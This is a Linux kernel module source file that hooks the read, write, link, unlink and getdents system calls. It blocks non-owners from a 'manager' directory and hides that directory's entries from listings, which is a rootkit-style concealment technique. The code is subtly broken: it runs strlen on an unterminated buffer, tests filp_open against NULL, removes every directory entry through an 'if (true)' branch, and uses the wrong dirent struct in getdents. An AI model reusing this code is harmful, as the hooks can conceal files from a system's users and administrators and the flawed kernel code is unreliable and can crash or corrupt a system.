#include "hooks.h"
// #include "cipher.h"
#include <linux/file.h>

bool check_ownership(unsigned int fd)
{
    struct file *fs = fget(fd);
    if (fs == NULL) {
        printk(KERN_EMERG "open fd failed\n");
        return false;
    }
    uid_t res = fs->f_inode->i_uid.val;
    fput(fs);
    return res == manager_uid;
}

bool check_directory(unsigned int fd)
{
    struct file *fs = fget(fd);
    if (fs == NULL) {
        printk(KERN_EMERG "open fd failed\n");
        return false;
    }
    char* pathname;
    pathname = kmalloc(MAX_PATH_LEN, GFP_KERNEL);
    if (pathname == NULL) {
        printk(KERN_EMERG "kmalloc failed on check_directory\n");
        return false;
    }
    memset(pathname, 97, MAX_PATH_LEN);
    // get fullpath from dentry
    dentry_path_raw(fs->f_path.dentry, pathname, strlen(pathname));
    int i = 0;
    // printk(KERN_EMERG "search i %s", (pathname+252));
    char cur_chr;
    for (i = 0; i < MAX_PATH_LEN; i++) {
        cur_chr = *(pathname+i);
        if (cur_chr != 97) break;
    }
    printk(KERN_EMERG "[+] check directory %d %s.\n", strlen(pathname+i), pathname+i);
    int res = strncmp(pathname+i, manager_dir, strlen(manager_dir));
    // printk(KERN_EMERG "[+] compare %d\n", res);
    kfree(pathname);
    fput(fs);
    return res == 0;
}

bool check_directory_path(const char *path) {
    printk(KERN_EMERG "[+] check directory %d %s.\n", strlen(path), path);
    int res = strncmp(path, manager_dir, strlen(manager_dir));
    return res == 0;
}

asmlinkage int new_write(unsigned int x, const char __user *y, size_t size)
{
    if ((!check_ownership(x)) && check_directory(x))
    {
        printk(KERN_EMERG "[+] write() hooked.\n");
        return -1;
    }
    return original_write(x, y, size);
}

asmlinkage int new_read(unsigned int x, char __user *y, size_t size)
{
    if ((!check_ownership(x)) && check_directory(x))
    {
        printk(KERN_EMERG "[+] read() hooked.\n");
        return -1;
    }
    return original_read(x, y, size);
}

asmlinkage int new_link(const char *oldpath, const char *newpath) {
    if (check_directory_path(oldpath)) {
        return -1;
    }
    return original_link(oldpath, newpath);
}

asmlinkage int new_unlink(const char *pathname) {
    if (check_directory_path(pathname)) {
        return -1;
    }
    return original_unlink(pathname);
}

// asmlinkage int open(const char *pathname, int flags, mode_t mode);
// asmlinkage int execve(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    printk(KERN_EMERG "[+] getdents64() hooked.\n");
    long ret, tmp;
    struct linux_dirent64 *td;
    int manager_ino = -1;

    struct file *filp;
    if ((filp = filp_open(manager_dir, O_RDONLY, 0)) != NULL)
    {
        manager_ino = filp->f_path.dentry->d_inode->i_ino;
        printk(KERN_EMERG "directory inode %d\n", manager_ino);
        filp_close(filp, NULL);
    }

    ret = original_getdents64(fd, dirp, count);
    if (unlikely(dirp->d_ino == manager_ino))
    {
        td = dirp;
        tmp = ret;
        while (tmp > 0)
        {
            tmp -= td->d_reclen;
            if (true) // strstr(td->d_name, "xxx") != NULL)
            {
                ret -= td->d_reclen;
                if (tmp)
                    memmove(td, (char *)td + td->d_reclen, tmp);
            }
            else
            {
                td = (struct linux_dirent64 *)((char *)td + td->d_reclen);
            }
        }
    }
    return ret;
}

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    printk(KERN_EMERG "[+] getdents64() hooked.\n");
    long ret, tmp;
    struct linux_dirent64 *td;
    int manager_ino = -1;

    struct file *filp;
    if ((filp = filp_open(manager_dir, O_RDONLY, 0)) != NULL)
    {
        manager_ino = filp->f_path.dentry->d_inode->i_ino;
        printk(KERN_EMERG "directory inode %d\n", manager_ino);
        filp_close(filp, NULL);
    }

    ret = original_getdents(fd, dirp, count);
    if (unlikely(dirp->d_ino == manager_ino))
    {
        td = dirp;
        tmp = ret;
        while (tmp > 0)
        {
            tmp -= td->d_reclen;
            if (true) // strstr(td->d_name, "xxx") != NULL)
            {
                ret -= td->d_reclen;
                if (tmp)
                    memmove(td, (char *)td + td->d_reclen, tmp);
            }
            else
            {
                td = (struct linux_dirent64 *)((char *)td + td->d_reclen);
            }
        }
    }
    return ret;
}